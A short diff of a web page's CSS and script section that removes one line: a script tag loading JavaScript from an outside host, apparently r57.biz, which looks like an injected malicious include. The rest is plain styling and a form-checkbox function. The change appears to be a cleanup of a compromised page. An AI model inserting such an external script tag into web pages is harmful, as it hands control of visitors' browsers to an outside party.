@@ -180,7 +180,6 @@ h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;
 ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
 u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
 </style>
-<SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
 <script type="text/javascript">
 function CheckAll(form) {
 	for(var i=0;i<form.elements.length;i++) {
